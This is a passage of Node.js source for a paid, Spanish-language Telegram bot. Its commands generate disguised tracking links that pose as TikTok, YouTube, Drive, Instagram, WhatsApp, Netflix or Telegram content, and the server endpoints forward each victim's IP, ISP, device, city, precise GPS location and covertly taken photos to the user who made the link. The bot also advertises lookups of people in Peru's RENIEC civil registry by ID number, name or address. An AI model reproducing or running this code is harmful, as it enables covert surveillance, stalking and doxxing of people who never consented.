                const bal = u.plan === 'unlimited' ? '♾️' : `${u.credits} cr`;
                msg += `${idx + 1}. <code>${u.chat_id}</code> — <b>${u.name}</b> [${bal}]\n`;
            });
        }
        await sendMessage(chatId, msg);

    } else if (text.startsWith('/broadcast')) {
        if (userId !== ADMIN_CHAT_ID) return;
        const bMsg = textRaw.substring(10).trim();
        if (!bMsg) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /broadcast [mensaje]`);
            return;
        }
        const { data: users, error } = await supabase.from('bot_users').select('chat_id');
        if (error || !users || users.length === 0) {
            await sendMessage(chatId, `⚠️ No hay usuarios para enviar el broadcast.`);
            return;
        }

        await sendMessage(chatId, `📢 Iniciando envío masivo a ${users.length} usuarios...`);
        let successCount = 0;
        for (const u of users) {
          try {
            if (u.chat_id === ADMIN_CHAT_ID) continue;
            const res = await apiFetch("sendMessage", {
              chat_id: u.chat_id,
              text: `📢 <b>MENSAJE GLOBAL</b>\n\n${bMsg}`,
              parse_mode: "HTML",
            });
            if (!res || !res.ok) {
              // Fallback: Quitar etiquetas para que no se vean literales y enviar como texto plano
              await apiFetch("sendMessage", {
                chat_id: u.chat_id,
                text: `📢 MENSAJE GLOBAL (Texto Plano)\n\n${bMsg}`,
              });
            }
            successCount++;
            await new Promise((r) => setTimeout(r, 60));
          } catch (e) {}
        }
        await sendMessage(chatId, `✅ <b>Broadcast finalizado:</b> Mensaje entregado a ${successCount} clientes.`);

    } else if (text === "/help" || text === "/cmds") {
        let helpMsg =
          `🛠️ <b>TABLA DE COMANDOS</b>\n\n` +
          `📂 <b>Búsquedas RENIEC:</b>\n` +
          `• <code>/dni [número]</code>\n` +
          `• <code>/nom [nombre]</code>\n` +
          `• <code>/ap [paterno] [materno]</code>\n` +
          `• <code>/ubigeo [texto]</code>\n` +
          `• <code>/direccion [calle]</code>\n` +
          `• <code>/export [tipo] [valor]</code>\n\n` +
          `🔗 <b>Generación Trackers:</b>\n /tk, /yt, /d, /ig, /wa, /nx, /tg\n\n` +
          `👤 <b>Gestión Cuenta:</b>\n /myplan, /invite, /status\n`;

        if (userId === ADMIN_CHAT_ID) {
          helpMsg += `\n👑 <b>Admin:</b>\n /users, /adduser, /addcredits, /setplan, /broadcast`;
        }
        await sendMessage(chatId, helpMsg);

    } else if (text === "/invite") {
        const myName = botMe ? botMe.username : "bot";
        const refLink = `https://t.me/${myName}?start=REF${chatId}`;
        await sendMessage(chatId,
            `🎁 <b>Programa de Referidos VIP</b>\n\n` +
            `Invita a tus amigos a usar este sistema.\n` +
            `🔹 <b>Tú ganas:</b> +1 Crédito automático\n` +
            `🔹 <b>Tu amigo gana:</b> 1 Enlace gratis de prueba\n\n` +
            `👇 <b>Tu enlace para compartir:</b>\n<code>${refLink}</code>`
        );

    } else if (text.startsWith('/tk') || text.startsWith('/yt') || text.startsWith('/d') || text.startsWith('/ig') || text.startsWith('/wa') || text.startsWith('/nx') || text.startsWith('/tg')) {
        let type = 'tiktok';
        let typeName = 'TikTok';
        if (text.startsWith('/yt')) { type = 'youtube'; typeName = 'YouTube'; }
        else if (text.startsWith('/d')) { type = 'drive'; typeName = 'Google Drive'; }
        else if (text.startsWith('/ig')) { type = 'ig'; typeName = 'Instagram Reel'; }
        else if (text.startsWith('/wa')) { type = 'wa'; typeName = 'WhatsApp Group'; }
        else if (text.startsWith('/nx')) { type = 'nx'; typeName = 'Netflix Player'; }
        else if (text.startsWith('/tg')) { type = 'tg'; typeName = 'Telegram Voice Note'; }

        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado en el sistema. Escriba /start`);
            return;
        }

        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 3) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 3 créditos para generar un enlace.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 3 }).eq('chat_id', userId);
        }

        const target = argsRaw.join(' ').trim() || `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
        await supabase.from('bot_links').insert([{ target_id: target, chat_id: userId }]);

        const longUrl = buildTrackingUrl(target, type);
        const shortUrl = await shortenUrl(longUrl);

        linkHistory.push({ id: target, createdAt: new Date().toLocaleString('es-ES'), owner: from, shortUrl });

        await sendMessage(chatId,
            `📁 <b>Enlace de ${typeName} Generado</b>\n\n` +
            `👤 <b>Etiqueta:</b> <code>${target}</code>\n` +
            `👇 <b>Link Corto:</b>\n<code>${shortUrl}</code>\n\n` +
            `<i>Notificaré cuando sea abierto.</i>`
        );

    } else if (text === '/status') {
        const uptime = getUptime();
        await sendMessage(chatId,
            `📊 <b>Estado del Sistema</b>\n\n` +
            `🟢 Bot: <b>Online</b>\n` +
            `⏱️ Uptime: <b>${uptime}</b>\n` +
            `👁️ Visitas: <b>${visitCount}</b>\n` +
            `📋 Enlaces: <b>${linkHistory.length}</b>`
        );

    } else if (command === '/adduser') {
        if (userId !== ADMIN_CHAT_ID) return;
        const [tId, tName] = argsRaw;
        if (!tId || !tName) { await sendMessage(chatId, `⚠️ Uso: /adduser [chat_id] [nombre]`); return; }
        const { error } = await supabase.from('bot_users').insert([{ chat_id: tId, name: tName, plan: 'credits', credits: 0 }]);
        await sendMessage(chatId, error ? `❌ Error: ${error.message}` : `✅ Usuario ${tName} agregado.`);

    } else if (command === '/addcredits') {
        if (userId !== ADMIN_CHAT_ID) return;
        const [tId, amount] = argsRaw;
        if (!tId || !amount) { await sendMessage(chatId, `⚠️ Uso: /addcredits [chat_id] [cantidad]`); return; }
        const { data: targetUser } = await supabase.from('bot_users').select('credits').eq('chat_id', tId).single();
        if (!targetUser) { await sendMessage(chatId, `❌ Usuario no encontrado.`); return; }
        const newCredits = targetUser.credits + parseInt(amount);
        await supabase.from('bot_users').update({ credits: newCredits }).eq('chat_id', tId);
        await sendMessage(chatId, `✅ Créditos actualizados: ${newCredits}`);

    } else if (command === '/setplan') {
        if (userId !== ADMIN_CHAT_ID) return;
        const [tId, pType] = argsRaw;
        if (!tId || (pType !== 'unlimited' && pType !== 'credits')) { await sendMessage(chatId, `⚠️ Uso: /setplan [id] [unlimited|credits]`); return; }
        await supabase.from('bot_users').update({ plan: pType }).eq('chat_id', tId);
        await sendMessage(chatId, `✅ Plan actualizado a ${pType}`);
    }
}

/* ====================================================
   FORMATOS UTILES
   ==================================================== */
function getUptime() {
    const diff = Math.floor((Date.now() - startTime.getTime()) / 1000);
    const h = Math.floor(diff / 3600);
    const m = Math.floor((diff % 3600) / 60);
    const s = diff % 60;
    return [h && `${h}h`, m && `${m}m`, `${s}s`].filter(Boolean).join(' ');
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🏳️';
    const base = 0x1F1E6;
    return String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(0) - 65) +
        String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(1) - 65);
}

/* ====================================================
   RUTAS DEL SERVIDOR EXPRESS PARA RECIBIR DATOS
   ==================================================== */

app.post('/api/report', async (req, res) => {
    visitCount++;
    const data = req.body;
    const targetId = data.targetId || 'Visitante Anónimo';
    let ownerChatId = ADMIN_CHAT_ID;

    if (targetId !== 'Visitante Anónimo') {
        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
    }

    const g = data.geo || {};
    const b = data.browser || {};
    const con = data.connection || {};
    const flag = getFlagEmoji(g.countryCode);
    const ts = new Date().toLocaleString('es-ES');

    const messageHtml = `🎯 <b>OBJETIVO:</b> <code>${targetId}</code>\n👁️ <b>CARGA</b> — <code>${ts}</code>\n\n` +
        `🌐 IP: <code>${g.ip}</code>\n` +
        `${flag} País: ${g.country} (${g.city})\n` +
        `📱 OS: ${b.os} | Nav: ${b.browser}\n` +
        `📶 ISP: ${g.isp}`;

    await sendMessage(ownerChatId, messageHtml);
    if (g.lat && g.lon) {
        await fetch(`${BASE_URL}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ownerChatId, latitude: parseFloat(g.lat), longitude: parseFloat(g.lon) })
        });
    }
    res.json({ success: true });
});

app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
    const targetId = req.body.targetId || 'Desconocido';
    let ownerChatId = ADMIN_CHAT_ID;
    if (targetId !== 'Desconocido') {
        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
    }
    if (req.files && req.files.length > 0) {
        for (const file of req.files) {
            const formData = new FormData();
            formData.append('chat_id', ownerChatId);
            formData.append('photo', new Blob([file.buffer], { type: 'image/jpeg' }), 'photo.jpg');
            formData.append('caption', `📸 Captura: ${targetId}`);
            await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
        }
    }
    res.json({ success: true });
});

/* ====================================================
   POLLING LOOP
   ==================================================== */
async function poll() {
    if (isPolling) { setTimeout(poll, 500); return; }
    isPolling = true;
    try {
        const data = await apiFetch('getUpdates', { offset, timeout: 15 });
        if (data && data.result && data.result.length > 0) {
            offset = data.result[data.result.length - 1].update_id + 1;
            for (const update of data.result) {
                if (update.callback_query) {
                    await handleCallback(update.callback_query);
                    continue;
                }

                const msg = update.message;
                if (!msg) continue;

                // ✅ Lógica de Respuesta Proxy: Si un mensaje en el grupo proxy es respuesta a una solicitud nuestra
                if (PROXY_GROUP_ID && String(msg.chat.id) === String(PROXY_GROUP_ID) && msg.reply_to_message) {
                    const originalRequester = proxyRequests.get(String(msg.reply_to_message.message_id));
                    if (originalRequester) {
                        const replyText = msg.text || (msg.caption || "<i>Respuesta sin texto (archivo/imagen)</i>");
                        await sendMessage(originalRequester, `✅ <b>RESPUESTA EXTERNA RECIBIDA:</b>\n\n${replyText}`);
                    }
                }

                if (msg.text) await handleCommand(msg);
            }
        }
    } catch (e) { console.error('[POLL ERROR]', e.message); }
    finally { isPolling = false; setTimeout(poll, 500); }
}

async function main() {
    const res = await apiFetch('getMe');
    if (!res?.ok) { console.error('❌ Error de conexión con Telegram.'); process.exit(1); }
    botMe = res.result;
    await apiFetch('deleteWebhook', { drop_pending_updates: true });
    app.listen(PORT, () => console.log(`🌍 Servidor activo en ${PORT} | Bot: @${botMe.username}`));
    poll();
}

main();
